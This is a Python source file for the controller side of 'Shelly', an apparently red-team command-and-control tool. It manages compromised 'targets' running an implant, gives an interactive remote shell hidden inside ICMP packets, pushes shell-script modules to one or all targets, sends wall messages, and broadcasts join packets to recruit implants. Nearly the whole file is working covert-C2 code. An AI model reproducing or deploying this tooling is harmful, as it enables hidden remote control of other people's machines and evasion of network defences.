#!/usr/bin/python3

"""
Shelly controller
Vaughn Woerpel (vaughnw128/apicius)
"""

from scapy.all import sniff, IP, Ether, ICMP, Raw, sr
from lib.shlib import Host
from columnar import columnar
from tinydb import TinyDB, Query
import os
from termcolor import colored
from lib.parser import ArgumentParser
import readline # Needed for better control when using interact
from multiprocessing import Process, Manager

# Global manager for the interact function to lock the input away
# until the incoming command has completed
manager = Manager()
shell_lock = manager.Value(bool, False)

TTL = int(64)
ICMP_ID = int(12800)

# Database directory
db_dir = "/var/lib/shelly/db.json"

class Controller(Host):
    """
    Controller class
     
    Extends from Host and incorporates special sniff callback responses specific
    to the needs of a controller
    """

    def __init__(self):
        super().__init__()

        # Reads from the same database file as shelly daemon
        self.db = TinyDB(db_dir)

    """
    Sniff callback responses
    """

    def sniffing(self, target_ip: str | None = None) -> None:
        """
        Special controller sniffer
        
        Similar to the sniffer in shlib, but filters to be only the specified target
        """

        if target_ip:
            sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")
        else:
            sniff(iface=self.iface, prn=self.sniff_callback, filter=f"icmp", store="0")

    def instruction(self, shellpack: dict) -> None:
        """
        Parses in instruction prompts received back from implant

        If the message is truncated, don't return input control, 
        but if it's complete then return control
        """

        match shellpack['option']:
            case "TRUNCATED":
                print(shellpack['data'].decode(), end="")
            case "COMPLETED":
                print(shellpack['data'].decode())
                shell_lock.value = False
            case "ERROR":
                print(f"[ERROR] {shellpack['data'].decode()}")
                shell_lock.value = False
            case _:
                print(shellpack['data'].decode())
                shell_lock.value = False

    """
    Command functions
    """

    def list_info(self) -> None:
        """
        Lists all the info about connected/disconnected targets and modules

        Very cumbersome function but gets it all done with cool columnar formatting
        """

        # Grabs all the targets and sorts them by number
        targets = self.db.all()
        targets = sorted(targets, key=lambda d: d['number'])

        # Generates the columns for targets
        response = "\nTargets:\n"

        headers = ['id', 'ip', 'status', 'location']
        data = []
        for target in targets:
            data.append([target['number'], target['ip'], target['status'], target['location']])
        
        if len(data) != 0:
            response += columnar(data, headers, no_borders=True)
        else:
            response += "\n  No targets connected\n"
        
        # Generates the columns for modules
        response += "\nModules:\n"

        headers = ['name', 'description']
        data = []
        for module in os.listdir('./modules'):
            if ".sh" in module:
                # Opens the file to grab the description from it
                # Checks to see if there is a line starting with # DESCRIPTION: and reads that in
                with open(f"./modules/{module}","r") as file:
                    desc = "Placeholder description. Please add a '# DESCRIPTION: {text}' tag."
                    for line in file.readlines():
                        if line.startswith("# DESCRIPTION:"):
                            desc = (line[14:]).strip()
                data.append([module.split('.')[0], desc])

        if len(data) != 0:
            response += columnar(data, headers, no_borders=True)
        else:
            response += "\n  No modules loaded"
        
        return response
    
    def rm_target(self, target_num: str) -> None:
        """
        Removes a specified target from the database
        """

        # Gets the list of targets (one or all)
        targets = self.get_targets(target_num)

        for target in targets:
            try:
                self.db.remove(Query().id == target['id'])
                print(f"Removed target {target['number']} from the database")
            except Exception:
                print(f"Failed to remove target {target}")
    
    def interact(self, target_num: str) -> None:
        """
        Command function to interact with a specified target

        Uses readline and shell lock to have a user friendly semi interactive terminal
        """

        # Only grabs a single target from get_targets
        target = self.get_targets(target_num)[0]

        # Starts the sniffer side process
        sniffer = Process(target=self.sniffing, args=(target['ip'],))
        sniffer.start()

        while True:
            # If the shell isn't locked, allow input
            if not shell_lock.value:
                cmd = input(colored("shell > ", "red"))

                # Immediately set shell lock here even before the command 
                # sends so that it locks before it prompts the user again
                shell_lock.value = True
                if cmd == "exit":
                    sniffer.kill()
                    break
                # Runs a command filter on it to make sure it's not a command that wont work
                elif len(cmd) != 0 and not self.filter_commands(cmd):
                    self.send(target['ip'], "instruction", cmd.encode())
                else:
                    shell_lock.value = False

    def run(self, target_num: int, module: str, verbose: bool) -> None:
        """
        Run command and allows for modules to be sent to a target 

        Reads modules from the module dir lets modules be sent to all targets
        """

        # Gets target or all targets
        targets = self.get_targets(target_num)
        
        if verbose:
            # Starts a sniffer to get a callback with the super sniffer because I don't want only current IP
            sniffer = Process(target=Host.sniffing, args=(target['ip'],))
            sniffer.start()

        # Checks to see if module exists then runs through all targets
        # Maybe add a nonverbose version with no sniffer?
        try:
            with open(f"./modules/{module}.sh","r") as f:
                for target in targets:
                    self.send(target['ip'], "module", f.read().encode())
                    print(f"Module sent to {target['ip']}")
        except FileNotFoundError:
            print("Module does not exist")

        # Only gives module output if verbose
        if verbose:
            shell_lock.value = True
            while True:
                if not shell_lock.value:
                    sniffer.kill()
                    break

    def broadcast(self, target_num: str, message: str) -> None:
        """
        Broadcast command to send a (funny/evil) message to a target or all targets
        """

        # Grabs list of targets
        targets = self.get_targets(target_num)

        # Builds the wall command
        message = f"wall {message}"

        for target in targets:
            self.send(target['ip'], 'instruction', message.encode())
            print(f"Broadcasted to {target['ip']}")

    def connect(self) -> None:
        # base_ip = self.ip.split(".")
        # base_ip = f"{base_ip[0]}.{base_ip[1]}.{base_ip[2]}."

        # existing_ips = [target['ip'] for target in self.db.all() if target['status'] == "CONNECTED"]
        # existing_ips.append(self.ip)

        # for i in range(1, 256):
        #     ip = base_ip + str(i)
        #     if ip not in existing_ips:
        #         self.send(ip, "join")
        #         print(f"Connect sent to {ip}")

        shellpacks = self.build_shellpacks("join")

        for shellpack in shellpacks:
            data = (Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
            sr(data, timeout=0, verbose=0)
        

    """
    Helper methods
    """

    def filter_commands(self, cmd: str) -> bool:
        """
        Filters out 'scary' commands from the interact function
        """

        cmd = cmd.split(" ")[0]
        if cmd in ("vim", "nano", "vi", "visudo", "watch", "emacs"):
            print(f"Command {cmd} is not valid as it requires an interactive shell")
            return True
        return False

    def get_targets(self, target_num: str) -> list:
        """
        Gets all the targets or gets a single target
        """

        # Gets all targets
        if target_num == "all":
            return self.db.all()
        
        # Gets single target
        target = self.db.search(Query().number == int(target_num))[0]
        if target['status'] == "DISCONNECTED":
            print("This target is not connected")
            return None
        return [target]

def main():
    # Define the controller
    controller = Controller()

    # Initialize the custom argparser
    parser = ArgumentParser(
                    prog='shelly.py')
    parser.add_argument('command', choices=["ls", "rm", "interact", "run", "broadcast", "connect"], help='The command to execute')
    # Create a help list for the commands with the custom parser
    parser.set_commands_help({
        'ls': '\tList connected targets',
        'rm': '\tRemove a target',
        'interact': 'Interact with a specified target using the ICMP shell',
        'run': '\tRuns an included module against a specified target or all targets',
        'broadcast': 'Broadcasts a message to all users on a target',
        'connect': 'Sends a connect command to all targets'
        })

    module_names = [module.split(".")[0] for module in os.listdir('./modules')]
    targets = [str(target['number']) for target in controller.db.all()]
    targets.append("all")
    
    parser.add_argument('-t', '--target', choices=targets, help='The target to interact with/run modules on. Specifying \'all\' will select ALL targets.')  
    parser.add_argument('-m', '--module', choices=module_names, help='The module to use for the run command')  
    parser.add_argument('-M', '--message', help='The message to be sent with broadcast. Contain the string with quotation marks')
    parser.add_argument('-v', '--verbose', default=False, action='store_true', help="Verbosity argument")
    args = parser.parse_args()

    # Makes sure target is set for specifc commands
    if args.command in ('interact', 'run', 'rm', 'broadcast') and (args.target is None):
        parser.error(f"The command {args.command} requires you to set a target with --target")

    # Match statement to determine which function to call
    match args.command:
        case "ls":
            print(controller.list_info())
        case "rm":
            controller.rm_target(args.target)
        case "interact":
            if args.target == "all":
                parser.error(f"The command {args.command} can only take one target")
            controller.interact(args.target)
        case "run":
            if args.module is None:
                parser.error(f"The command {args.command} requires you to declare a module\nModules can be found by running shelly.py ls")
            controller.run(args.target, args.module, args.verbose)
        case "broadcast":
            if args.message is None:
                parser.error(f"The command {args.command} requires you to declare a message")
            controller.broadcast(args.target, args.message)
        case "connect":
            controller.connect()

if __name__ == "__main__":
    main()

            
    
    
